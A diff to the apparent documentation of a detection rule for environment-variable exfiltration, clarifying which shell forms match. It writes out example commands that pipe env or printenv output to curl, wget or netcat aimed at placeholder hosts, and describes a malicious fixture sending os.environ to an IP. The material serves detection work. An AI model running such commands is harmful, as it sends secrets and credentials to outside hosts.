@@ -88,12 +88,13 @@ match.
   `env | wget --post-file=/dev/stdin URL`, `env | nc HOST PORT`. A
   single-quoted stdin argument (`'@-'`) also matches.
 - The dump as the stdin of curl, wget, or netcat, through a here-string or a
-  redirect: `curl --data-binary @- URL <<< "$(env)"`,
+  redirect on the same command: `curl --data-binary @- URL <<< "$(env)"`,
   `nc HOST PORT < <(printenv)`.
 
 Comments, single-quoted text, and `echo` or `printf` lines that only print a
-curl or wget command do not match. A printed string with a command
-substitution (`echo "$(env | curl -d @- URL)"`) still runs, so it matches.
+curl or wget command do not match. A printed string with an unescaped command
+substitution (`echo "$(env | curl -d @- URL)"`) still runs, so it matches. An
+escaped one (`\$(env)`) prints as text and does not match.
 
 Malicious fixture shape: a `.py` file that sends `os.environ` to an IP.
 Benign fixture: reads a single env var and uses it locally, posts a static
